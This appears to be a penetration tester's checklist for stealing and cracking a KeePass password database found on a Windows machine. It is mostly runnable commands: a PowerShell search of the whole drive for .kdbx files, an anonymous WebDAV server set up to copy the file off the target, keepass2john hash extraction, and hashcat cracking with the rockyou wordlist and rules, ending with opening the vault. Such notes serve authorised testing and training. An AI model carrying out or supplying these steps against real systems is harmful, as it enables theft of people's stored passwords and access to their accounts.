# Keypass Cracking Passwords

Keypass found on windows box (under apps and features)

```pwsh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem cmdlet to locate files in specified locations. 
```

> -Path C:\ to search the whole drive.

> -Include to specify the file types we want to include,
> 
> -File and -Recurse arguments to get a list of files and search in subdirectories.
> 
> -ErrorAction to SilentlyContinue to silence errors and continue execution.

- [ ] Copy file to local machine
    \- webdav/ftp/ect...
    \- \[ \] Quick Webdav setup (if wsgidav is setup pip3 install wsgidav)
    \- on local `mkdir srvdir`
    \- `~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --root=./srvdir --auth=anonymous --root ./srvdir`
    \- \[ \] map it or open it in remote machine and copy file to it
    \- \[ \] move file
    \- \[ \] kill webdav / optional cleanup
    
- [ ] List and validate
    `ls -al Database.kdbx`
    
- [ ] Convert to hash file
    `keepass2john Database.kdbx > keepass.hash`
    
- [ ] Delete <u>Database:</u>$keepass$....
    \- $keepass$*2*60*0*d74e29a727e9338717d27a7
    
- [ ] Find hashcat value
    `hashcat --help | grep -i "KeePass"`
    
- [ ] Use value with hashcat on file
    `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`
    
- [ ] Open Keypass program and use master key to extract values, use master password and None for file...
    ![708427fb1d5ccd4aa147d0831c4c8453.png](../../_resources/708427fb1d5ccd4aa147d0831c4c8453.png)
    ![4914d1b868cd2e1175d75b46f6ba9e3e.png](../../_resources/4914d1b868cd2e1175d75b46f6ba9e3e.png)